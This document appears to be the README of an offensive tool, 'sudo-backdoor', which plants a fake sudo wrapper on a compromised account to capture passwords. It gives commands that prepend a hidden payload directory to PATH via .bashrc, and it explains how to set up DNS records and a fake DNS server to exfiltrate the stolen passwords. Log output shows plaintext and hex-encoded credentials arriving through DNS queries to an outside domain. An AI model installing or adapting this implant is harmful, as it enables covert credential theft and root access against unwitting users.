# sudo-backdoor
Wraps around `sudo` and logs users credentials, for those annoying times when you get a shell/file write on a sudoers account without knowing their password.

# Installation
## 1. Installing the implant
Append the following line to the target user's `.bashrc` (or their appropriate shell's rc file) by running the following command:

`$ echo "export PATH=~/.payload:$PATH" >> ~/.bashrc`

Then, create `~/.payload/sudo` and paste the code found in this repository's `sudo` in there.

*Don't forget to make the bash script executable by issuing the following command:*

`$ chmod a+x ~/.payload/sudo`

Obviously you might have to adapt this installation recipe to fit the user's shell. If they are using zsh, then install to ~/.zshrc, etc.

## 2. Running the DNS Server

### 2.1 Setting up the nameserver
In your DNS settings, add a new wildcard NS (Name Server) record attached to the `de` subdomain, pointing to an A record directed at your server.

Example: 

```
| Record | Host | Value              | TTL   |
|--------+------+--------------------+-------|
| A      | ns1  | 10.0.0.2           | 1 min |
| NS     | *.de | ns1.yourdomain.com | 1 min |
```

### 2.2 Running the server
Then, on your server at 10.0.0.2, download the `dns-server.py` script and execute it as root.

Example: `# python dns-server.py`

Once it is started, when users affected by the sudo implant enter their credentials in the `sudo` prompt, you will receive their credentials in the `dns-server.py` stdout.

# Usage
Proof of concept: `testuser` is the target with password `passw0rd`.

## Targeted system
```
[testuser:~]$ echo $PATH
/home/testuser/.payload:/usr/local/sbin:/usr/local/bin:/usr/bin
[testuser:~]$ sudo id
[sudo] password for testuser:                → A wrong password is inserted here
Sorry, try again.
[sudo] password for testuser:                → The correct password is inserted here
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log) 
[testuser:~]$ sudo id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),19(log) 
```

`sudo` remembers the cached credentials and does not prompt the second time around, as expected.

## DNS Server output
```
[root:~]# python dns-server.py
[06-26-17 11:06:42] Started DNS server on 0.0.0.0:53.
[06-26-17 11:11:57] #0  173.239.230.96  INVALID testuser        somewr0ng!pa55word
[06-26-17 11:08:11] #0  173.239.230.96  VALID   testuser        passw0rd
```
 
# Notes
Long passwords are also handled, example:
``` 
[06-27-17 11:47:39] Received 0.0.7465737475736572.54686973497341566572794C6F6E6750617373776F72645468617453686F75.de.windows-analytics.com
[06-27-17 11:47:39] #0  173.239.230.96  VALID   testuser        ThisIsAVeryLongPasswordThatShou
[06-27-17 11:47:39] Received 0.1.7465737475736572.6C644E6F744265496E746572727570746564496D70726F7065726C79.de.windows-analytics.com
[06-27-17 11:47:39] #1  173.239.230.96  VALID   testuser        ldNotBeInterruptedImproperly
```
Probably due to DNS round-robin, DNS queries sometimes do not reach the server in the proper order. Use the first column to identify the order.

# Licenses
`dns-server.py` is a fork of https://github.com/pathes/fakedns by @pathes
